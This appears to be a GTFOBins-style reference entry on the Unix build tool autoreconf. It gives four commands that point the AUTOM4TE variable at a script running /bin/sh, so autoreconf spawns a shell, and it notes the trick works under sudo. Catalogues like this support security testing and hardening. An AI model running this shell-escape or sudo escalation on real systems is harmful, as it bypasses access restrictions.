---
type: gtfobin
name: autoreconf
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# autoreconf

## shell

```bash
echo '/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
echo AC_INIT >configure.ac
AUTOM4TE=/path/to/temp-file autoreconf
```
_The shell is invoked multiple times._
**Contexts:** sudo, unprivileged
